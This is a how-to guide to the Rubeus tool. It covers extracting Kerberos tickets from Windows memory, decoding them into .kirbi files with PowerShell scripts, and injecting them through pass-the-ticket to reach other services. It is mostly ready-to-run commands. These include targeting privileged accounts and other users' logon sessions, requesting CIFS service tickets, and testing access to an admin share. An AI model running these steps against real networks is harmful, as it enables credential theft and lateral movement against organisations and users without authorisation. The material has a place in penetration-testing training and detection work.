# Rubeus Kerberos Ticket Guide

## Overview

Rubeus can perform the functional equivalent of Mimikatz's `sekurlsa::tickets /export` through its `dump` command. It extracts Kerberos tickets from memory and outputs them as Base64-encoded `.kirbi` (KRB-CRED) data, or saves a selected ticket directly as a `.kirbi` file.

```powershell
# Mimikatz equivalent
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Rubeus equivalent
.\Rubeus.exe dump /nowrap
```

`dump` extracts accessible TGTs and service tickets. With elevated privileges, it can access tickets from other logon sessions on the local system; without elevation, it is generally limited to the current user's accessible tickets.

## Triage First

Use `triage` before dumping tickets to identify the most relevant logon session and ticket.

```powershell
.\Rubeus.exe triage
```

Example output:

```text
Current LUID : 0x777062

UserName              Service                    EndTime
--------              -------                    -------
svc_backup            krbtgt/CORP.LOCAL          11/21/2026 08:12:00
svc_backup            cifs/fileserver.corp.local 11/20/2026 15:30:00
jdoe                  krbtgt/CORP.LOCAL          11/20/2026 18:00:00
```

### What to Look For

| Field | Meaning | Why it matters |
|---|---|---|
| `Current LUID` | The logon session ID of the process running Rubeus | Useful as a starting point, but not automatically the best target |
| `LUID` | Windows logon session identifier | Groups tickets by user/session |
| `UserName` | Account that owns the ticket | Prioritize service, privileged, and high-value accounts |
| `Service` | Target service of the ticket | `krbtgt` means TGT; other values are service tickets |
| `EndTime` | Ticket expiration time | Focus on tickets that are still valid |

Prioritize:

1. Valid `krbtgt/<DOMAIN>` tickets, because these are TGTs.
2. Tickets belonging to service or privileged accounts.
3. Tickets with a long remaining validity period.
4. Service tickets for high-value services such as `cifs`, `http`, `mssql`, `ldap`, or `host`.
5. Tickets in other LUIDs when running elevated.

`Current LUID` is only the current process context. It does not necessarily contain the most valuable ticket.

## Dumping Tickets

### Dump the Current Session

```powershell
.\Rubeus.exe dump /nowrap
```

This extracts all accessible tickets for the current context and prints them as Base64.

### Dump a Specific LUID

After reviewing `triage`, target the relevant LUID:

```powershell
.\Rubeus.exe dump /luid:0x777062 /nowrap
```

### Dump Only TGTs

```powershell
.\Rubeus.exe dump /luid:0x777062 /service:krbtgt /nowrap
```

### Dump a Specific Service Ticket

```powershell
.\Rubeus.exe dump /luid:0x777062 /service:cifs /nowrap
```

### Save One Ticket as a `.kirbi` File

`dump` does not support `/outfile`. The `dump` command prints the ticket as Base64 text, so decode the blob yourself:

```powershell
$raw = .\Rubeus.exe dump /luid:0x777062 /service:krbtgt /nowrap | Out-String

$pattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
$b64 = [regex]::Match($raw, $pattern).Groups[1].Value
if ($b64) {
    [IO.File]::WriteAllBytes('C:\Temp\tgt_0x777062.kirbi', [Convert]::FromBase64String($b64))
}
```

> **Pitfall:** `dump` output also prints a `Base64(key)` field (the ticket's session key)
> immediately *before* `Base64EncodedTicket`, and that key value is itself 100+ Base64
> characters long:
>
> ```text
> KeyType                  :  aes256_gcm_ghash_credguard
> Base64(key)              :  V1JBUAMAAAASAAAAqwAAAAAAAAAXAAAAZAAAAAEAAAABAQAA...
> Base64EncodedTicket   :
>
>       doIGpTCCBqGgAwIBBaEDAgEWooIE+jCCBPZhggTy...
> ```
>
> A naive `[regex]::Match($raw, '[A-Za-z0-9+/=]{100,}')` (no label anchor) matches the
> **first** run of 100+ Base64 characters in the text — the session key, not the ticket —
> and silently writes an invalid `.kirbi` file (it decodes fine, but the bytes are a key
> blob, not an ASN.1 `KRB-CRED` structure, so `ptt` fails to inject it). Always anchor the
> regex on the `Base64EncodedTicket` label as shown above; a valid ticket blob decodes to
> bytes starting with `doIG` (the DER `KRB-CRED` sequence tag), which is a good sanity
> check while debugging extraction scripts.

This approach works for one ticket; run it once per LUID and service. See the conversion script below for every ticket in one pass.

## Export All Tickets

Rubeus does not have a direct one-command equivalent to Mimikatz's automatic multi-file `.kirbi` export. The practical approach is:

1. Run `dump /nowrap`.
2. Capture the Base64 output.
3. Decode each Base64 blob into a `.kirbi` file.

### Save Raw Base64 Output

```powershell
.\Rubeus.exe dump /nowrap > C:\Temp\rubeus_tickets.txt
```

This is useful for collection, but the output is Base64 text rather than ready-to-use `.kirbi` files.

### Convert All Tickets to `.kirbi` Files

```powershell
$raw = .\Rubeus.exe dump /nowrap | Out-String

# Anchored on the "Base64EncodedTicket" label (see the pitfall note above) so each match
# is an actual ticket, not a "Base64(key)" session key value.
$pattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
$matches = [regex]::Matches($raw, $pattern)

$i = 0
foreach ($m in $matches) {
    $i++
    $b64 = $m.Groups[1].Value
    $bytes = [Convert]::FromBase64String($b64)
    [IO.File]::WriteAllBytes("C:\Temp\ticket_$i.kirbi", $bytes)
}

Write-Host "$i tickets exported."
```

This creates files such as:

```text
C:\Temp\ticket_1.kirbi
C:\Temp\ticket_2.kirbi
C:\Temp\ticket_3.kirbi
```

A `.kirbi` file is a KRB-CRED structure containing one or more Kerberos tickets and their associated session keys.

## Pass-the-Ticket

Pass-the-Ticket (PtT) injects an existing Kerberos ticket into a logon session. It does not require the account password or NTLM hash, but the ticket must still be valid.

```text
Extract ticket -> Inject with ptt -> Use ticket for Kerberos authentication
```

### Inject a `.kirbi` File

```powershell
.\Rubeus.exe ptt /ticket:C:\Temp\tgt.kirbi
```

This injects the ticket into the current logon session.

### Inject Base64 Ticket Data

```powershell
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

Rubeus accepts either a Base64-encoded ticket or the path to a `.kirbi` file.

### Inject Into Another Logon Session

This requires elevated privileges:

```powershell
.\Rubeus.exe ptt /ticket:C:\Temp\admin.kirbi /luid:0x54321
```

### Verify Injected Tickets

```powershell
.\Rubeus.exe klist
```

## TGT vs. Service Ticket

| Ticket type | Meaning | Typical use |
|---|---|---|
| TGT (`krbtgt/<DOMAIN>`) | Ticket-Granting Ticket | Request additional service tickets |
| Service ticket (`cifs/`, `http/`, `mssql/`, `ldap/`) | Ticket for a specific service | Directly access that service |

A TGT is usually more flexible because it can be used to request service tickets for services the account is authorized to access. A service ticket is immediately usable but is tied to its specific service.

## Request and Inject a Service Ticket

After obtaining or injecting a TGT, request a service ticket:

```powershell
.\Rubeus.exe asktgs /ticket:C:\Temp\tgt.kirbi /service:cifs/fileserver.corp.local /ptt
```

Or save it first:

```powershell
.\Rubeus.exe asktgs /ticket:C:\Temp\tgt.kirbi /service:cifs/fileserver.corp.local /outfile:C:\Temp\cifs.kirbi
.\Rubeus.exe ptt /ticket:C:\Temp\cifs.kirbi
```

Example access test:

```powershell
dir \\fileserver.corp.local\c$
```

Access succeeds only if the account associated with the ticket has the required permissions.

## Practical Workflow

```powershell
# 1. Identify available tickets and sessions
.\Rubeus.exe triage

# 2. Extract a TGT from a selected LUID and decode the Base64 blob into a .kirbi file
$raw = .\Rubeus.exe dump /luid:0x777062 /service:krbtgt /nowrap | Out-String
$pattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
$b64 = [regex]::Match($raw, $pattern).Groups[1].Value
[IO.File]::WriteAllBytes('C:\Temp\tgt.kirbi', [Convert]::FromBase64String($b64))

# 3. Inject the TGT into the current session
.\Rubeus.exe ptt /ticket:C:\Temp\tgt.kirbi

# 4. Request and inject a service ticket
.\Rubeus.exe asktgs /ticket:C:\Temp\tgt.kirbi /service:cifs/fileserver.corp.local /ptt

# 5. Validate access
dir \\fileserver.corp.local\c$
```

## Key Takeaways

- Use `triage` to identify the relevant LUID, user, service, and expiration time.
- Use `dump` to extract tickets.
- Use `/luid` to target a specific logon session.
- Use `/service:krbtgt` to extract TGTs.
- Use `/nowrap` for single-line Base64 output.
- `dump` has no `/outfile` switch; decode the Base64 blob into a `.kirbi` file yourself.
- When extracting that blob with a regex, anchor on the `Base64EncodedTicket` label — `dump` also prints a `Base64(key)` field just before it that is itself 100+ Base64 characters long and will be matched instead by an unanchored pattern.
- Use `ptt` to inject a ticket.
- Use `asktgs` to request service tickets using a TGT; `asktgs` supports `/outfile`.
- A valid TGT enables further ticket requests; a service ticket is bound to one service.
- Elevated privileges are required to target tickets in other users' logon sessions.

## Important Limitations

- A TGT does not automatically grant access to every service.
- A service ticket only works for its associated service and SPN.
- Expired tickets cannot be used for PtT.
- Injecting into another LUID requires elevated context.
- Rubeus can output all tickets as Base64, but exporting every ticket as an individual `.kirbi` file requires post-processing.
- An unanchored Base64 regex can silently extract the `Base64(key)` field instead of the ticket; the result still decodes as valid bytes, so the mistake only surfaces later when `ptt` fails to inject the "ticket".
